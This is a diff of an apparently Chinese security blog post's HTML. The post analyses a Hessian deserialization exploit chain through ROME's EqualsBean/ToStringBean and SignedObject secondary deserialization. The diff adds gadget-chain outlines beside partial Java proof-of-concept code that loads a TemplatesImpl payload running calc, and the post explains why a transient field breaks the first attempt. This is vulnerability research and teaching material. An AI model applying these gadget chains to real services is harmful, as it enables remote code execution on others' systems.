@@ -152,7 +152,7 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2023-07-26 01:27:27
+          2023-07-26 05:21:13
         </span>
         
       </div>
@@ -213,7 +213,12 @@
 
 
 
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="失败的poc及原因"><a href="#失败的poc及原因" class="headerlink" title="失败的poc及原因"></a>失败的poc及原因</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="失败的poc及原因"><a href="#失败的poc及原因" class="headerlink" title="失败的poc及原因"></a>失败的poc及原因</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java">hessianinput<span class="token punctuation">.</span>readObject
+    hashmap<span class="token punctuation">.</span>put
+	    <span class="token class-name">EqualsBean</span><span class="token punctuation">.</span>hashcode
+       		 <span class="token class-name">ToStringBean</span><span class="token punctuation">.</span>toString <span class="token operator">--</span><span class="token operator">-></span>getter	<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
     <span class="token comment">//自己写的工具类，大概功能就是生成一个装填了执行calc的恶意类的templates类</span>
     <span class="token class-name">Object</span> templates <span class="token operator">=</span> tools<span class="token punctuation">.</span><span class="token function">getTemplates</span><span class="token punctuation">(</span>tools<span class="token punctuation">.</span><span class="token function">getshortclass</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
@@ -229,7 +234,16 @@
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690219965484-1253a413-8b43-4a72-8f02-0929e2e84667.png#averageHue=%23373631&clientId=u3806880a-78e5-4&from=paste&height=115&id=u31713bfc&originHeight=172&originWidth=690&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=96469&status=done&style=none&taskId=u328f74ae-c759-4059-86ce-6f286225b24&title=&width=460" alt="image.png"><br>很显然，没有计算器弹出，失败了，这是啥原因呢？</p>
 <p>在HessianOutput.writeObject中，使用了UnsafeSerializer#introspect方法来获取对象中的字段，判断了成员变量标识符，如果是transient和static字段则不会参与序列化和反序列化流程，<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687874075115-ebfd41e6-f489-4e68-86d1-1326cc27864e.png#averageHue=%23f8f5f0&from=url&id=T10mj&originHeight=145&originWidth=1155&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title="><br>我们在触发templates的getter时，需要用到几个参数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690220257752-1bbbbfe1-f53c-4548-8215-5d6930b56211.png#averageHue=%23546758&clientId=u3806880a-78e5-4&from=paste&height=127&id=uc3cab5b7&originHeight=191&originWidth=700&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79564&status=done&style=none&taskId=u757ce161-d53b-4331-ae35-6e8ea1fceff&title=&width=466.6666666666667" alt="image.png"><br>其中的_tfactory就被transient修饰，导致无法参与序列化和反序列化流程，所以就G了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690220265264-84c24fe8-d111-45cf-b97d-fabae527bfad.png#averageHue=%23527f4d&clientId=u3806880a-78e5-4&from=paste&height=58&id=ud506f43e&originHeight=87&originWidth=592&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=27270&status=done&style=none&taskId=ue5daed5b-3fbe-4c28-bf65-4a36115564d&title=&width=394.6666666666667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690222140749-717bf669-0acb-4e18-ab03-194cd6e17e90.png#averageHue=%23494b4b&clientId=u3806880a-78e5-4&from=paste&height=376&id=uac250f28&originHeight=564&originWidth=787&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=225961&status=done&style=none&taskId=u31a706b4-e559-4b32-a61f-05daf18e760&title=&width=524.6666666666666" alt="image.png"><br>那么该怎么样才能避开呢？很显然，我们可以使用二次反序列化来触发原生的序列化和反序列化</p>
-<h4 id="二次反序列化poc"><a href="#二次反序列化poc" class="headerlink" title="二次反序列化poc"></a>二次反序列化poc</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+<h4 id="二次反序列化poc"><a href="#二次反序列化poc" class="headerlink" title="二次反序列化poc"></a>二次反序列化poc</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java">hessianinput<span class="token punctuation">.</span>readObject
+    hashmap<span class="token punctuation">.</span>put
+        <span class="token class-name">EqualsBean</span><span class="token punctuation">.</span>hashcode
+            <span class="token class-name">ToStringBean</span><span class="token punctuation">.</span>toString
+                <span class="token class-name">SignedObject</span><span class="token punctuation">.</span>getObject
+                        hashmap<span class="token punctuation">.</span>readObject<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-></span>hashmap<span class="token punctuation">.</span>put
+        					<span class="token class-name">EqualsBean</span><span class="token punctuation">.</span>hashcode
+           						 <span class="token class-name">ToStringBean</span><span class="token punctuation">.</span>toString<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
     <span class="token comment">//自己写的工具类，大概功能就是生成一个装填了执行calc的恶意类的templates类</span>
     <span class="token class-name">Object</span> templates <span class="token operator">=</span> tools<span class="token punctuation">.</span><span class="token function">getTemplates</span><span class="token punctuation">(</span>tools<span class="token punctuation">.</span><span class="token function">getshortclass</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -347,7 +361,7 @@ tools<span class="token punctuation">.</span><span class="token function">overri
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2023-07-26 01:27:27
+              2023-07-26 05:21:13
             </span>
             
           </div>
